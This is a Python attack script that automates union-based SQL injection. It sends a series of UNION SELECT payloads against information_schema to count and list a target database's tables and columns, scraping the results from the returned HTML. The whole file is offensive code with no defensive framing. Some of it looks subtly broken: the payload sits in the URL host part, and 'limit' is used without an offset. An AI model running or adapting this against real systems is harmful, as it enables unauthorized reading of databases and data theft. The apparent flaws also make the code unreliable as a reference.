import requests
import bs4


def fetchtablecount():
    url = (
        "http://localhost' and 0 union select 1,2,3,4,count(table_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema=database()"
        " -- -"
    )
    response = requests.get(url)
    soup = bs4.BeautifulSoup(response.text, "html.parser")
    result = soup.find(
        "div",
        {
            "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
        },
    )
    count = result.get_text().strip()
    return count


tableCount = fetchtablecount()
print(tableCount)


def fetchTableNames():
    for count in range(1, int(tableCount) + 1):
        url = (
            "http://localhost' and 0 union select 1,2,3,4,table_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.tables where table_schema=database() limit "
            + str(count)
            + " -- -"
        )
        response = requests.get(url)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        result = soup.find(
            "div",
            {
                "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
            },
        )
        tempTableName = result.get_text().strip()
        tableNames.append(tempTableName)


tableNames = []
fetchTableNames()
# print(tableNames)


result = []


def fetchColumnCount(tempTableName):
    url = (
        "http://localhost' and 0 union select 1,2,3,4,count(column_name),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema=database()and table_name='"
        + tempTableName
        + "'-- -"
    )
    response = requests.get(url)
    soup = bs4.BeautifulSoup(response.text, "html.parser")
    temp = soup.find(
        "div",
        {
            "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
        },
    )
    ColumnCount = temp.get_text().strip()
    return ColumnCount


def fetchColumnNames():
    for table in tableNames:
        columncount = fetchColumnCount(table)
        columnNames = fetchSingleColumnName(table, columncount)
        
        tempDic = {"tableName": table, "columnNames": columnNames}
        print(tempDic)
        result.append(tempDic)


def fetchSingleColumnName(tableNames, columncount):
    columnNames = []
    for count in range(1, int(columncount)):
        url = (
            "http://localhost' and 0 union select 1,2,3,4,column_name,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from information_schema.columns where table_schema=database()and table_name='"
            + tableNames
            + "' limit "
            + str(count)
            + "-- -"
        )

        response = requests.get(url)
        soup = bs4.BeautifulSoup(response.text, "html.parser")
        temp = soup.find(
            "div",
            {
                "style": "font-family:'Josefin Sans', sans-serif; line-height: 35px !important"
            },
        )
        columnName = temp.get_text().strip()
        columnNames.append(columnName)
    return columnNames


fetchColumnNames()
print(result)

